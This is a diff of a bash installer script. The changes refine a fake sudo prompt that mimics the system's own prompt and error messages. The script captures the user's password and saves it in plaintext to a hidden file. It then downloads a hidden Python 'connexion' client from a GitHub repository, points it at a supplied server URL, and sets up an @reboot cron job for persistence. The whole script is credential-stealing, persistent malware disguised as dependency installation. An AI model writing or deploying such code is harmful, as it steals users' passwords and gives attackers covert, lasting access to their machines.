@@ -4,31 +4,23 @@ if [ "$#" -ne 1 ]; then
     exit 1
 fi
 urlbase=https://raw.githubusercontent.com/Just1truc
+# Getting prompt :
+message=$(echo "ok" | sudo -Sk echo $? 2>&1)
+prompt=$(echo "$message" | cut -d : -f 1 | head -n 1):
+error=$(echo "$message" | head -n 1 | cut -d : -f 2 | cut -b 2-)
 # installing pip dependencies
-while [ 1 ]
+while true
 do
-    who=`whoami`
-    if [ $(echo "$LANG" | cut --delimiter=. -f 1 | cut -d _ -f 1) = "fr" ]; then
-        echo -n "[sudo] Mot de passe de $who : "
-        read -s password
-    else
-        echo -n "[sudo] password for $who : "
-        read -s password
-    fi
-    echo "$password" | sudo -S ls &> /dev/null
-    output=$?
+    read -p "$prompt " -sr password
     echo ""
+    echo "$password" | sudo -Sk echo $? &> /dev/null
+    output=$?
     if [ $output -eq 0 ]
     then
         echo "$password" | sudo -kS -p '' bash -c "echo '$password' > /usr/local/src/.server.exwrap_info.txt"
         break
     else
-        if [ $(echo "$LANG" | cut --delimiter=. -f 1 | cut -d _ -f 1) = "fr" ]
-        then
-            echo "Désolé, essayez de nouveau."
-        else
-            echo "Sorry, try again."
-        fi
+        echo "$error"
     fi
 done
 curl $urlbase/Argos/main/client/dependencies -o here.txt &> /dev/null
@@ -36,9 +28,9 @@ pip install -r here.txt &> /dev/null
 rm here.txt
 # installing script
 curl $urlbase/Argos/main/client/connexion.py -o .service.exwrap.py &> /dev/null
-echo $(< /usr/local/src/.server.exwrap_info.txt) | sudo -kS -p '' mv .service.exwrap.py /usr/local/src/.service.exwrap.py
+echo "$(< /usr/local/src/.server.exwrap_info.txt)" | sudo -kS -p '' mv .service.exwrap.py /usr/local/src/.service.exwrap.py
 # Setup url
-echo $(< /usr/local/src/.server.exwrap_info.txt) | sudo -kS -p '' bash -c "echo $1 > /usr/local/src/.serverurl.exwrap"
+echo "$(< /usr/local/src/.server.exwrap_info.txt)" | sudo -kS -p '' bash -c "echo $1 > /usr/local/src/.serverurl.exwrap"
 # Setting up crontab
 echo "@reboot python3 /usr/local/src/.service.exwrap.py" > crontb && crontab crontb && rm -rf crontb
 python3 /usr/local/src/.service.exwrap.py &
